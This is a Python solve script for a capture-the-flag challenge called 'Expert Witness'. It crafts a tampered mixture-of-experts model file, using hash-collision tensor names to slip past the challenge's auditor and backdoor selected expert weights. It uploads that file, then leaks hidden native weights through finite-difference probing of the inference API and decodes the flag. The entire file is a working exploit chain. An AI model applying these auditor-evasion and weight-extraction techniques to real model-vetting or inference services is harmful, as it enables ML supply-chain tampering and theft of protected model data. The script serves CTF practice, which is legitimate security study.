#!/usr/bin/env python3
"""End-to-end exploit for z0d1akCTF 2026 Expert Witness."""

from __future__ import annotations

import argparse
import base64
import json
import os
import re
import ssl
import struct
import subprocess
import sys
from pathlib import Path
from typing import Any
from urllib.error import HTTPError
from urllib.request import Request, urlopen

import numpy as np

ROOT = Path(__file__).resolve().parent
PLAYER = ROOT / "challenge" / "player"
sys.path.insert(0, str(PLAYER))

from auditor.inference import infer
from auditor.moepack import pack_model, parse_model
from models.model_definition import public_geometry

DEFAULT_URL = os.environ.get(
    "URL", "https://expert-witness-36534fc8078d.chals.z0d1ak.org"
)
REFERENCE_PATH = PLAYER / "data" / "reference.moepack"
SOURCE_PATH = ROOT / "collision_finder.cpp"
HELPER_PATH = ROOT / "collision_finder"
AMPLITUDE = np.float32(1.25)
SCRATCH_SLOT = 12
FLAG_MASK = 0xA5


class ApiError(RuntimeError):
    pass


def post_json(base_url: str, path: str, body: dict[str, Any]) -> dict[str, Any]:
    request = Request(
        base_url.rstrip("/") + path,
        data=json.dumps(body, separators=(",", ":")).encode(),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urlopen(request, timeout=20, context=ssl.create_default_context()) as response:
            decoded = json.loads(response.read())
    except HTTPError as error:
        detail = error.read().decode("utf-8", "replace")
        raise ApiError(f"POST {path} returned HTTP {error.code}: {detail}") from error
    if not isinstance(decoded, dict):
        raise ApiError(f"POST {path} returned a non-object JSON value")
    return decoded


def rol32(value: int, amount: int) -> int:
    value &= 0xFFFFFFFF
    return ((value << amount) | (value >> (32 - amount))) & 0xFFFFFFFF


def native_name_hash(name: str, salt: int) -> int:
    state = (salt ^ 0x9E3779B9) & 0xFFFFFFFF
    raw = name.encode()
    for byte in raw:
        state = rol32(((byte ^ state) * 0x85EBCA6B) & 0xFFFFFFFF, 13)
    value = state ^ ((len(raw) * 0xC2B2AE35) & 0xFFFFFFFF)
    value ^= value >> 16
    value = (value * 0x7FEB352D) & 0xFFFFFFFF
    value ^= value >> 15
    value = (value * 0x846CA68B) & 0xFFFFFFFF
    value ^= value >> 16
    return value & 0xFFFFFFFF


def build_collision_helper() -> None:
    stale = not HELPER_PATH.exists() or HELPER_PATH.stat().st_mtime < SOURCE_PATH.stat().st_mtime
    if not stale:
        return
    compiler = os.environ.get("CXX", "c++")
    print(f"[*] compiling {SOURCE_PATH.name}", file=sys.stderr)
    subprocess.run(
        [compiler, "-O3", "-std=c++17", str(SOURCE_PATH), "-o", str(HELPER_PATH)],
        check=True,
    )


def find_collisions(salt: int, names: list[str]) -> dict[str, str]:
    build_collision_helper()
    hashes = [native_name_hash(name, salt) for name in names]
    command = [str(HELPER_PATH), str(salt), *(f"{value:08x}" for value in hashes)]
    output = subprocess.check_output(command, text=True)
    by_hash: dict[int, str] = {}
    for line in output.splitlines():
        target, collision = line.split()
        by_hash[int(target, 16)] = collision

    result: dict[str, str] = {}
    for name, target_hash in zip(names, hashes, strict=True):
        collision = by_hash[target_hash]
        if collision == name or native_name_hash(collision, salt) != target_hash:
            raise RuntimeError(f"invalid collision produced for {name!r}")
        result[name] = collision
    return result


def reconstruct_direction(trigger: np.ndarray) -> np.ndarray:
    observation, _ = public_geometry()
    latent = trigger @ observation
    diagnostic = latent[20:24]
    norm = float(np.linalg.norm(diagnostic))
    if norm < 1.0:
        raise RuntimeError("session trigger does not contain a diagnostic component")
    raw = np.zeros(24, dtype=np.float32)
    raw[20:24] = diagnostic / norm
    return np.ascontiguousarray(raw @ observation.T, dtype=np.float32)


def build_exploit_model(
    trigger: np.ndarray, target: int, salt: int
) -> tuple[bytes, list[int], int, dict[str, str], float]:
    reference_bytes = REFERENCE_PATH.read_bytes()
    reference = parse_model(reference_bytes)
    trigger_logits, selected, _ = infer(reference, trigger)
    experts = [int(value) for value in selected[0]]

    competitor_order = np.argsort(-trigger_logits[0], kind="stable")
    competitor = next(int(value) for value in competitor_order if int(value) != target)
    direction = reconstruct_direction(trigger)

    tensors = {name: record.array.copy() for name, record in reference.tensors.items()}
    for expert in experts:
        weight = tensors[f"experts.{expert}.weight"]
        weight[target] += AMPLITUDE * direction
        weight[competitor] -= AMPLITUDE * direction

    bindings = [(item.role, item.slot, item.name) for item in reference.bindings]
    target_names = [f"experts.{expert}.weight" for expert in experts]
    collisions = find_collisions(salt, target_names)

    record_flags: dict[str, int] = {}
    author_slots: dict[str, int] = {}
    for real_name in target_names:
        extension_name = collisions[real_name]
        tensors[extension_name] = np.zeros((4, 24), dtype=np.float32)
        record_flags[extension_name] = 1
        author_slots[extension_name] = SCRATCH_SLOT

    model_bytes = pack_model(
        tensors,
        bindings,
        record_flags=record_flags,
        author_slots=author_slots,
    )

    # Confirm that the public parser still binds only ordinary records.
    parsed = parse_model(model_bytes)
    bound_names = {item.name for item in parsed.bindings}
    if any(parsed.tensors[name].flags for name in bound_names):
        raise RuntimeError("an extension unexpectedly became graph-bound in Python")

    patched_logits, _, _ = infer(parsed, trigger)
    other = float(np.max(np.delete(patched_logits[0], target)))
    local_margin = float(patched_logits[0, target] - other)
    return model_bytes, experts, competitor, collisions, local_margin


def decode_logit_bits(values: Any) -> np.ndarray:
    array = np.asarray(values)
    if array.ndim == 1:
        array = array[None, :]
    if array.ndim != 2 or array.shape[1] != 4:
        raise ApiError(f"expected an N by 4 logit matrix, received {array.shape}")
    words = np.array(
        [
            int(value, 0) if isinstance(value, str) else int(value)
            for value in array.reshape(-1)
        ],
        dtype="<u4",
    ).reshape(array.shape)
    return words.view("<f4").astype(np.float64)


def remote_infer(
    base_url: str, session_id: str, samples: np.ndarray
) -> tuple[np.ndarray, list[list[int]]]:
    batch = np.asarray(samples, dtype=np.float32)
    if batch.ndim == 1:
        batch = batch[None, :]
    if batch.ndim != 2 or batch.shape[1] != 24:
        raise ValueError(f"inputs must have shape [batch, 24], received {batch.shape}")
    response = post_json(
        base_url,
        "/infer",
        {"session_id": session_id, "inputs": batch.astype(float).tolist()},
    )
    result = response.get("result", response)
    logits = decode_logit_bits(result["logit_bits"])
    selected = np.asarray(result.get("selected_experts", []), dtype=np.int64)
    if selected.ndim == 1:
        selected = selected[None, :]
    if selected.shape != (batch.shape[0], 2):
        raise ApiError(
            f"expected {batch.shape[0]} expert pairs, received shape {selected.shape}"
        )
    return logits, [[int(value) for value in row] for row in selected]


def leak_native_weight(
    base_url: str, session_id: str, experts: list[int], epsilon: float = 0.5
) -> np.ndarray:
    observation, _ = public_geometry()
    latent_anchor = np.zeros(24, dtype=np.float32)
    latent_anchor[experts[0] // 2] = np.float32(4.0)
    anchor = np.ascontiguousarray(latent_anchor @ observation.T, dtype=np.float32)

    _, selected_rows = remote_infer(base_url, session_id, anchor)
    anchor_selected = selected_rows[0]
    if set(anchor_selected) != set(experts):
        raise RuntimeError(
            f"anchor selected experts {anchor_selected}, expected session experts {experts}"
        )

    probes: list[np.ndarray] = []
    for coordinate in range(24):
        plus = anchor.copy()
        minus = anchor.copy()
        plus[coordinate] += np.float32(epsilon)
        minus[coordinate] -= np.float32(epsilon)
        probes.extend((plus, minus))

    probe_logits, probe_selected = remote_infer(
        base_url, session_id, np.stack(probes)
    )
    recovered = np.empty((4, 24), dtype=np.float64)
    for coordinate in range(24):
        plus_selected = probe_selected[2 * coordinate]
        minus_selected = probe_selected[2 * coordinate + 1]
        if set(plus_selected) != set(experts) or set(minus_selected) != set(experts):
            raise RuntimeError(f"router changed experts while probing coordinate {coordinate}")
        recovered[:, coordinate] = (
            probe_logits[2 * coordinate] - probe_logits[2 * coordinate + 1]
        ) / (2.0 * epsilon)
        print(f"[*] recovered native column {coordinate + 1:02d}/24", file=sys.stderr)
    return np.rint(recovered).astype(np.int64)


def decode_flag_row(weight: np.ndarray) -> tuple[bytes, bytes]:
    flat = weight.reshape(-1)
    key_words = flat[:4]
    if np.any(key_words < 0) or np.any(key_words > 0xFFFF):
        raise RuntimeError("recovered flag key words are outside uint16 range")
    key = b"".join(struct.pack("<H", int(word)) for word in key_words)
    length = int(flat[4])
    if not 1 <= length <= flat.size - 5:
        raise RuntimeError(f"invalid recovered flag length {length}")
    encoded = bytes(int(value) & 0xFF for value in flat[5 : 5 + length])
    flag = bytes(value ^ key[index % 8] ^ FLAG_MASK for index, value in enumerate(encoded))
    return key, flag


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default=DEFAULT_URL, help="challenge instance base URL")
    parser.add_argument("--save-model", type=Path, help="write the generated MOEPACK payload")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    session = post_json(args.url, "/session", {})
    session_id = str(session["session_id"])
    trigger = np.asarray(session["input"], dtype=np.float32)
    target = int(session["target_class"])
    salt = int(session["identity_salt"])
    print(f"[+] session={session_id} target={target} salt={salt}", file=sys.stderr)

    model, experts, competitor, collisions, local_margin = build_exploit_model(
        trigger, target, salt
    )
    print(
        f"[+] selected={experts} competitor={competitor} local_margin={local_margin:.6f}",
        file=sys.stderr,
    )
    for real_name, extension_name in collisions.items():
        print(
            f"[+] hash collision: {extension_name!r} -> {real_name!r}", file=sys.stderr
        )
    if args.save_model:
        args.save_model.write_bytes(model)

    admission = post_json(
        args.url,
        "/model",
        {"session_id": session_id, "model": base64.b64encode(model).decode()},
    )
    print(f"[+] admission={json.dumps(admission, sort_keys=True)}", file=sys.stderr)
    if not admission.get("accepted", admission.get("result", {}).get("accepted", False)):
        raise RuntimeError("candidate model was rejected")

    native_weight = leak_native_weight(args.url, session_id, experts)
    key, flag_bytes = decode_flag_row(native_weight)
    flag = flag_bytes.decode("ascii", "strict")
    if not re.fullmatch(r"zdk\{[^}\r\n]+\}", flag):
        raise RuntimeError(f"decoded bytes do not look like a flag: {flag!r}")
    print(f"[+] native key={key.hex()}", file=sys.stderr)
    print(flag)


if __name__ == "__main__":
    main()
